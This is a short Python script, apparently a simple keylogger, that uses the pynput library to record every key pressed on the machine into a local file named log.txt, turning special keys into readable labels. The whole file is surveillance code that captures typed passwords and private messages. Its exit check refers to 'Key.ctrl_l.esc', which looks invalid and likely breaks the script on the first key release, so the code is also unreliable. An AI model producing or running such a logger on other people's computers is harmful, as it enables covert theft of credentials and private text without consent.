from pynput.keyboard import Key, Listener


def write_file(key):
    with open("log.txt", "a") as f:
        k = str(key).replace("'", "")
        if k.find(".space") > 0:
            f.write("\n")
        elif k.find(".shift") > 0:
            pass
        elif k[:4] == "Key.":
            if k.find(".enter") > 0:
                f.write(" " + k[4:].upper() + "\n")
            else:
                f.write(" " + k[4:].upper() + " ")
        else:
            f.write(k)


def on_release(key):
    if key == Key.ctrl_l.esc:
        return False


with Listener(on_press=write_file, on_release=on_release) as listener:
    listener.join()

